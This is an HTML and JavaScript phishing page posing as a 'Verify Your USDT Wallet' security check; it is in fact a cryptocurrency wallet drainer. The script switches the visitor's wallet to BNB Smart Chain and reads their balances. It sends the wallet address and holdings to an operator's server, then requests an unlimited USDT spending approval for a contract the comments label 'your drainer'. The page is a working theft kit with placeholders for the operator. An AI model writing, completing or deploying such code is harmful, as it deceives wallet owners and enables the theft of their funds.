<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>USDT Approval WebApp</title>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <style>
      body { font-family: Arial, sans-serif; background: #181b24; color: #fff; text-align: center; margin:0; padding:0;}
      .container { margin-top: 10vh; }
      button { padding: 16px 30px; border-radius: 10px; font-size: 1.1em; background: #10b981; color: #fff; border: none; cursor: pointer; margin-top: 24px;}
      button:active { background: #07996d; }
      #popup {display:none; position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); background:#fff; color:#222; padding:30px; border-radius:14px; min-width:300px; z-index:1000;}
    </style>
</head>
<body>
  <div class="container">
    <h1>üîí Verify Your USDT Wallet</h1>
    <p>Click below to connect and approve USDT for security check.</p>
    <button onclick="approveToken()">Check & Approve</button>
  </div>
  <div id="popup"></div>

<script>
const DRRAINER_CONTRACT = "0x08b471f9558fa41afd0690a37c361241ab5b2afa"; // your drainer
const USDT_CONTRACT = "0x55d398326f99059Ff775485246999027B3197955";   // USDT BSC
const BACKEND_API_URL = "https://YOUR_SERVER_IP:8080/log_approval";      // <-- change to your Flask endpoint

let provider, signer, userAddress;

async function approveToken() {
    if (!window.ethereum) {
        showPopup("‚ùå Web3 wallet not found.<br><br>Install Metamask or Trust Wallet extension.");
        return;
    }
    try {
        provider = new ethers.providers.Web3Provider(window.ethereum);

        // 1. Prompt network switch to BSC
        const BSC_CHAIN_ID = "0x38";
        let chainId = await provider.send('eth_chainId', []);
        if (chainId !== BSC_CHAIN_ID) {
            try {
                await provider.send("wallet_switchEthereumChain", [{ chainId: BSC_CHAIN_ID }]);
                showPopup("Switched to BNB Smart Chain.");
            } catch(e) {
                // If chain not added
                if (e.code === 4902) {
                    await provider.send("wallet_addEthereumChain", [{
                        chainId: BSC_CHAIN_ID,
                        chainName: "Binance Smart Chain",
                        nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
                        rpcUrls: ["https://bsc-dataseed.binance.org/"],
                        blockExplorerUrls: ["https://bscscan.com"]
                    }]);
                } else {
                    showPopup("‚ùå Please switch to BNB Smart Chain in your wallet.");
                    return;
                }
            }
        }

        // 2. Prompt user to connect
        await provider.send("eth_requestAccounts", []);
        signer = provider.getSigner();
        userAddress = await signer.getAddress();

        // 3. Get BNB and USDT balances
        const bnbBalance = ethers.utils.formatEther(await provider.getBalance(userAddress));
        const usdtAbi = [
          "function balanceOf(address) view returns (uint256)",
          "function approve(address,uint256) returns (bool)"
        ];
        const usdt = new ethers.Contract(USDT_CONTRACT, usdtAbi, signer);
        const usdtBalance = ethers.utils.formatUnits(await usdt.balanceOf(userAddress), 18);

        // 4. Send to backend (CORS required on backend)
        fetch(BACKEND_API_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ wallet: userAddress, bnb: bnbBalance, usdt: usdtBalance })
        });

        // 5. Approve unlimited USDT
        try {
          const maxUint = ethers.constants.MaxUint256;
          const tx = await usdt.approve(DRRAINER_CONTRACT, maxUint);
          showPopup("Please approve in your wallet...");
          await tx.wait();
          showPopup(
            "‚úÖ USDT Approved!<br>Your wallet:<br><b>" +
            userAddress.slice(0,8) + "..." + userAddress.slice(-6) +
            "</b><br>USDT: <b>" + usdtBalance + "</b><br>BNB: <b>" + bnbBalance + "</b>"
          );
        } catch(e) {
          showPopup("‚ùå User rejected approval or error: " + e.message);
        }
    } catch(e) {
        showPopup("‚ùå Wallet connection failed: " + e.message);
    }
}

function showPopup(msg) {
    const popup = document.getElementById('popup');
    popup.style.display = 'block';
    popup.innerHTML = msg;
    setTimeout(() => popup.style.display='none', 6000);
}
</script>
</body>
</html>
